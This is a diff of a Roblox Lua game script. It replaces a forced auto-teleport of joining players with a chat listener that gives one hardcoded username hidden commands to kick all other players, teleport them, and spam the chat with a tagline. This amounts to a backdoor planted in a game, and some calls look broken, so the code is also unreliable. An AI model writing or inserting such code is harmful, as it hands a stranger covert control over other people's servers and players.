@@ -1,25 +1,42 @@
-local targetMapID = 13659195151 -- ID do mapa
-local visitedPlayers = {}
-local teleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-local function tryTeleport(player)
-    if not visitedPlayers[player.UserId] then
-        local success, errorMessage
-        repeat
-            success, errorMessage = pcall(function()
-                teleportService:Teleport(targetMapID, player)
-            end)
-            
-            if not success then
-                warn("Falha ao tentar teleportar: " .. errorMessage)
-                wait(0.5)
+local monitoredPlayer = "rbxV1P3R"
+local spamActive = false
+local spamCoroutine
+
+game:GetService("Chat").MessagePosted:Connect(function(message, speaker)
+    if speaker.Name == monitoredPlayer then
+        if message:lower() == ".kick" then
+            for _, player in pairs(Players:GetPlayers()) do
+                if player.Name ~= monitoredPlayer then
+                    player:Kick("Você foi expulso do servidor!")
+                end
             end
-        until success
-        
-        visitedPlayers[player.UserId] = true
+        elseif message:lower() == ".tpa" then
+            for _, player in pairs(Players:GetPlayers()) do
+                if player.Name ~= monitoredPlayer then
+                    player:MoveTo(speaker.Character.HumanoidRootPart.Position)
+                end
+            end
+        elseif message:lower() == ".spam" then
+            if not spamActive then
+                spamActive = true
+                spamCoroutine = coroutine.create(function()
+                    while spamActive do
+                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top", "All")
+                        wait(1)
+                    end
+                end)
+                coroutine.resume(spamCoroutine)
+            end
+        elseif message:lower() == ".unspam" then
+            if spamActive then
+                spamActive = false
+                if spamCoroutine then
+                    coroutine.close(spamCoroutine)
+                end
+            end
+        end
     end
-end
-
-game.Players.PlayerAdded:Connect(function(player)
-    tryTeleport(player)
 end)
